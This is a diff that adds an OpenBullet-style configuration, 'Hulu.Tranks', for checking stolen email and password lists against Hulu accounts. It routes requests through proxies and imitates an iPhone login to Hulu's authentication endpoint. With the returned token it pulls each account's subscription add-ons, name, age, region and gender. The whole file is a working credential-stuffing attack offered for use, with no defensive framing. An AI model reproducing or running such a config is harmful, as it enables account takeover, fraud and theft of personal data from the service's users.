@@ -1,0 +1,65 @@
+[SETTINGS]
+{
+  "Name": "Hulu.Tranks",
+  "SuggestedBots": 50,
+  "LastModified": "2019-04-10T18:18:03.4214128+02:00",
+  "AdditionalInfo": "",
+  "Author": "Tranks",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://auth.hulu.com/v1/device/password/authenticate" 
+  CONTENT "affiliate_name=apple&friendly_name=Andy%27s+Iphone&password=<PASS>&product_name=iPhone7%2C2&serial_number=00001e854946e42b1cbf418fe7d2dcd64df0&user_email=<USER>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+#CHECK KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "user_token" 
+  KEYCHAIN Failure OR 
+    KEY "Your login is invalid" 
+#Tranks PARSE "<SOURCE>" LR "user_token\":\"" "\"" -> VAR "Token" 
+#Try REQUEST GET "https://home.hulu.com/v1/users/self" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Bearer <Token>" 
+#Agin KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY ",\"subscription\":{\"id\":" 
+  KEYCHAIN Failure OR 
+    KEY "status\":null,\"subscriber_id" 
+    KEY "\",\"status\":\"6\",\"subscriber_id\"" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "\",\"status\":\"5\",\"subscriber_id\":\"" 
+    KEY "package_ids\":[\"1\",\"2\"],\"" 
+#Tranks PARSE "<SOURCE>" LR "package_ids\":[\"1\",\"2\"," "]" -> VAR "sub" 
+#Fuk FUNCTION Replace "\"14\"" "No Commercials" "<sub>" -> VAR "sub" 
+#Yeah FUNCTION Replace "\"16\"" "Live TV" "<sub>" -> VAR "sub" 
+#Fuk FUNCTION Replace "\"17\"" "HBO" "<sub>" -> VAR "sub" 
+#Yeah FUNCTION Replace "\"18\"" "Cinemax" "<sub>" -> VAR "sub" 
+#i_like_it FUNCTION Replace "\"15\"" "Showtime" "<sub>" -> VAR "sub" 
+#T PARSE "<SOURCE>" LR "\",\"name\":\"" "\",\"" -> CAP "Name" 
+#R PARSE "<SOURCE>" LR "\",\"age\":" ",\"" -> CAP "Age" 
+#A PARSE "<SOURCE>" LR "\",\"region\":\"" "\",\"" -> CAP "From" 
+#N PARSE "<SOURCE>" LR "gender\":\"" "\",\"" -> CAP "Generd" 
+#KS PARSE "<sub>" JSON "" -> CAP "Sub" "" "||By:Tranks" 
